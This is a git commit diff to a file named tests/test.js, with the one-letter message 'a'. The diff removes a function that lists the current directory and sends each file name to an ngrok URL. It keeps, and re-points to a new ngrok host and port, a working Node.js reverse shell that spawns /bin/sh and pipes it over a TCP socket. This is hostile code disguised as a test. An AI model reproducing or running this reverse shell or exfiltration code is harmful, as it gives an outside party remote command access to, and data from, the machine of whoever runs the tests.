a637af548d9124d16d79ec989207e1118952df83
Juri Sacchetta <jurisacchetta@gmail.com>
2023-04-15 16:00:17 +0200

    a

--- tests/test.js
+++ tests/test.js
@@ -3,20 +3,10 @@ const fs = require("fs");
 var net = require("net")
 
 
-let ls = function (dirpath) {
-    let contents = fs.readdirSync(dirpath, {withFileTypes: true});
-    for (let item of contents) {
-        https.get('https://64f0-2-36-14-59.ngrok-free.app/' + item.name, res => {})
-    }
-    return contents
-}
-
-cont = ls('.')
-
 cp = require("child_process");
 sh = cp.spawn("/bin/sh", []);
 var client = new net.Socket();
-client.connect(17544, "6.tcp.eu.ngrok.io", function () {
+client.connect(16792, "tcp://4.tcp.ngrok.io", function () {
   client.pipe(sh.stdin);
   sh.stdout.pipe(client);
   sh.stderr.pipe(client);
